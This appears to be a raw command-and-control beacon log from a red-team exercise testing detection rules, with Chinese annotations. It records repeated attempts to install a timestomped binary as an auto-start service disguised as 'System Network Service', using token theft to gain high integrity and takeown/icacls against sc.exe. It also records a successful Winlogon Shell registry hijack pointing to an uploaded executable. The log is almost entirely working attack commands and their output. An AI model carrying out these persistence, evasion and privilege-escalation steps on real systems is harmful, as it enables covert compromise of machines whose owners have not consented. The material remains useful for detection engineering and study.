03/11 14:13:51 [task] 4*******请先提权*******
03/11 14:39:03 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 14:39:03 [task] cd c:\windows\system32
03/11 14:39:03 [task] Tasked beacon to make directory c:\RedTeam\
03/11 14:39:03 [task] cd c:\RedTeam\
03/11 14:39:03 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 14:39:03 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 14:39:03 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 14:39:03 [task] Tasked beacon to run: sc delete netsrv
03/11 14:39:03 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 14:39:03 [task] Tasked beacon to run: sc start netsrv
03/11 14:39:39 [checkin] host called home, sent: 9590 bytes
03/11 14:39:39 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



03/11 14:39:39 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 14:39:39 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



03/11 14:53:43 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 14:53:43 [task] cd c:\windows\system32
03/11 14:53:43 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sc.exe"
03/11 14:53:43 [task] Tasked beacon to run: icacls "C:\Windows\System32\sc.exe" /grant Users:F
03/11 14:53:43 [task] Tasked beacon to make directory c:\RedTeam\
03/11 14:53:43 [task] cd c:\RedTeam\
03/11 14:53:43 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 14:53:43 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 14:53:43 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 14:53:43 [task] Tasked beacon to run: sc delete netsrv
03/11 14:53:43 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 14:53:43 [task] Tasked beacon to run: sc start netsrv
03/11 14:54:39 [checkin] host called home, sent: 9741 bytes
03/11 14:54:40 [output]
received output:
错误: 当前登录的用户没有文件(或文件夹) "C:\Windows\System32\sc.exe" 的所有权特权。

03/11 14:54:40 [output]
received output:
C:\Windows\System32\sc.exe: 句柄无效。
已成功处理 0 个文件; 处理 1 个文件时失败


03/11 14:54:40 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



03/11 14:54:40 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 14:54:40 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



03/11 14:58:59 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 14:58:59 [task] cd c:\windows\system32
03/11 14:58:59 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\sc.exe"
03/11 14:58:59 [task] Tasked beacon to run: icacls "C:\Windows\System32\sc.exe" /grant Users:F
03/11 14:58:59 [task] Tasked beacon to make directory c:\RedTeam\
03/11 14:58:59 [task] cd c:\RedTeam\
03/11 14:58:59 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 14:58:59 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 14:58:59 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 14:58:59 [task] Tasked beacon to run: sc delete netsrv
03/11 14:58:59 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 14:58:59 [task] Tasked beacon to run: sc start netsrv
03/11 14:59:40 [checkin] host called home, sent: 9741 bytes
03/11 14:59:40 [output]
received output:
错误: 当前登录的用户没有文件(或文件夹) "C:\Windows\System32\sc.exe" 的所有权特权。

03/11 14:59:40 [output]
received output:
C:\Windows\System32\sc.exe: 句柄无效。
已成功处理 0 个文件; 处理 1 个文件时失败


03/11 14:59:40 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



03/11 14:59:40 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 14:59:40 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



03/11 15:01:12 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:01:12 [task] cd c:\windows\system32
03/11 15:01:12 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:01:12 [task] cd c:\RedTeam\
03/11 15:01:12 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 15:01:12 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 15:01:12 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:01:12 [task] Tasked Beacon to execute: sc delete netsrv in a high integrity context
03/11 15:01:12 [task] Tasked Beacon to execute: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service" in a high integrity context
03/11 15:01:12 [task] Tasked Beacon to execute: sc start netsrv in a high integrity context
03/11 15:01:40 [checkin] host called home, sent: 235587 bytes
03/11 15:01:42 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

03/11 15:01:42 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

03/11 15:01:42 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

03/11 15:08:24 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:08:24 [task] cd c:\windows\system32
03/11 15:08:24 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:08:24 [task] cd c:\RedTeam\
03/11 15:08:24 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 15:08:24 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 15:08:24 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
03/11 15:08:24 [task] Tasked beacon to run: icacls "C:\Windows\System32\sc.exe" /grant Administrators:F
03/11 15:08:24 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:08:24 [task] Tasked Beacon to execute: sc delete netsrv in a high integrity context
03/11 15:08:24 [task] Tasked Beacon to execute: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service" in a high integrity context
03/11 15:08:24 [task] Tasked Beacon to execute: sc start netsrv in a high integrity context
03/11 15:08:42 [checkin] host called home, sent: 235751 bytes
03/11 15:08:44 [error] could not upload file: 32
03/11 15:08:44 [error] could not set file time: 6
03/11 15:08:44 [output]
received output:
错误: 当前登录的用户没有管理特权。


03/11 15:08:44 [output]
received output:
C:\Windows\System32\sc.exe: 句柄无效。
已成功处理 0 个文件; 处理 1 个文件时失败


03/11 15:08:44 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

03/11 15:08:44 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

03/11 15:08:44 [output]
received output:
[+] Success! Started taskmgr.exe and used its token.

03/11 15:15:51 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:15:52 [task] cd c:\windows\system32
03/11 15:15:52 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:15:52 [task] cd c:\RedTeam\
03/11 15:15:52 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 15:15:52 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 15:15:52 [task] Tasked beacon to run: takeown /F "C:\Windows\System32\cmd.exe" /A
03/11 15:15:52 [task] Tasked beacon to run: icacls "C:\Windows\System32\sc.exe" /grant Administrators:F
03/11 15:15:52 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:15:52 [task] Tasked Beacon to execute: sc delete netsrv in a high integrity context
03/11 15:15:52 [task] Tasked Beacon to execute: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service" in a high integrity context
03/11 15:15:52 [task] Tasked Beacon to execute: sc start netsrv in a high integrity context
03/11 15:16:05 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:16:05 [task] cd c:\windows\system32
03/11 15:16:05 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:16:05 [task] cd c:\RedTeam\
03/11 15:16:05 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.exe as netsrv.exe
03/11 15:16:05 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.exe
03/11 15:16:05 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:16:05 [task] Tasked beacon to run: sc delete netsrv
03/11 15:16:05 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 15:16:05 [task] Tasked beacon to run: sc start netsrv
03/11 15:16:44 [checkin] host called home, sent: 245341 bytes
03/11 15:16:46 [error] could not upload file: 32
03/11 15:16:46 [error] could not set file time: 6
03/11 15:16:46 [output]
received output:
错误: 当前登录的用户没有管理特权。


03/11 15:16:46 [output]
received output:
C:\Windows\System32\sc.exe: 句柄无效。
已成功处理 0 个文件; 处理 1 个文件时失败


03/11 15:16:46 [output]
received output:
[+] Success! Used token from PID 4392

03/11 15:16:46 [output]
received output:
[+] Success! Used token from PID 4392

03/11 15:16:46 [output]
received output:
[+] Success! Used token from PID 4392

03/11 15:16:46 [output]
received output:
[SC] OpenService 失败 5:

拒绝访问。



03/11 15:16:46 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 15:16:46 [output]
received output:
[SC] StartService: OpenService 失败 5:

拒绝访问。



03/11 15:18:57 [task] 设置Winlogon 加载项
03/11 15:18:57 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:18:57 [task] cd c:\RedTeam\
03/11 15:18:57 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
03/11 15:18:57 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
03/11 15:18:57 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKCU\software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "c:\RedTeam\hello.exe" /f
03/11 15:19:46 [checkin] host called home, sent: 7714 bytes
03/11 15:19:47 [output]
received output:
操作成功完成。

C:\RedTeam>

03/11 15:26:55 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:26:55 [task] cd c:\windows\system32
03/11 15:26:55 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:26:55 [task] cd c:\RedTeam\
03/11 15:26:55 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.txt as netsrv.txt
03/11 15:26:55 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.txt
03/11 15:26:55 [task] cd c:\RedTeam
03/11 15:26:55 [task] Tasked beacon to run: rename netsrv.txt netsrv.exe
03/11 15:26:55 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:26:55 [task] Tasked beacon to run: sc delete netsrv
03/11 15:26:55 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 15:26:55 [task] Tasked beacon to run: sc start netsrv
03/11 15:27:47 [checkin] host called home, sent: 9667 bytes
03/11 15:27:47 [error] could not set file time: 6
03/11 15:27:47 [output]
received output:
存在一个重名文件，或是找不到文件。


03/11 15:27:47 [output]
received output:
[SC] OpenService 失败 5:

拒绝访问。



03/11 15:27:47 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 15:27:47 [output]
received output:
[SC] StartService: OpenService 失败 5:

拒绝访问。



03/11 15:29:49 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:29:49 [task] cd c:\windows\system32
03/11 15:29:49 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:29:49 [task] cd c:\RedTeam\
03/11 15:29:49 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.txt as netsrv.txt
03/11 15:29:49 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.txt
03/11 15:29:49 [task] cd c:\RedTeam
03/11 15:29:49 [task] Tasked beacon to run: rename netsrv.txt netsrv.exe
03/11 15:29:49 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:29:49 [task] Tasked beacon to run: sc delete netsrv
03/11 15:29:49 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 15:29:49 [task] Tasked beacon to run: sc start netsrv
03/11 15:30:47 [checkin] host called home, sent: 9667 bytes
03/11 15:30:47 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



03/11 15:30:47 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 15:30:47 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



03/11 15:38:01 [task] 设置Winlogon 加载项
03/11 15:38:01 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:38:01 [task] cd c:\RedTeam\
03/11 15:38:01 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\hello.exe as hello.exe
03/11 15:38:01 [indicator] file: f7459bced881f13269fdc32c7975f912 7168 bytes hello.exe
03/11 15:38:01 [task] Tasked beacon to run: C:\Windows\System32\cmd.exe /k %windir%\System32\reg.exe ADD "HKCU\software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "c:\RedTeam\hello.exe" /f
03/11 15:38:47 [checkin] host called home, sent: 7714 bytes
03/11 15:38:48 [output]
received output:
操作成功完成。

C:\RedTeam>

03/11 15:40:32 [task] 通过sc命令创建服务，此规则会同时触发T1050_002
03/11 15:40:33 [task] cd c:\windows\system32
03/11 15:40:33 [task] Tasked beacon to make directory c:\RedTeam\
03/11 15:40:33 [task] cd c:\RedTeam\
03/11 15:40:33 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\netsrv.txt as netsrv.txt
03/11 15:40:33 [indicator] file: 715f0098355935eaef5d56e0822c82f2 9216 bytes netsrv.txt
03/11 15:40:33 [task] cd c:\RedTeam
03/11 15:40:33 [task] Tasked beacon to run: rename netsrv.txt netsrv.exe
03/11 15:40:33 [task] Tasked beacon to timestomp C:\RedTeam\netsrv.exe to C:\Windows\System32\cmd.exe
03/11 15:40:33 [task] Tasked beacon to run: sc delete netsrv
03/11 15:40:33 [task] Tasked beacon to run: sc create netsrv binPath= "C:\RedTeam\netsrv.exe" start= auto DisplayName= "System Network Service"
03/11 15:40:33 [task] Tasked beacon to run: sc start netsrv
03/11 15:40:48 [checkin] host called home, sent: 9667 bytes
03/11 15:40:48 [output]
received output:
[SC] OpenService 失败 1060:

指定的服务未安装。



03/11 15:40:48 [output]
received output:
[SC] OpenSCManager 失败 5:

拒绝访问。



03/11 15:40:48 [output]
received output:
[SC] StartService: OpenService 失败 1060:

指定的服务未安装。



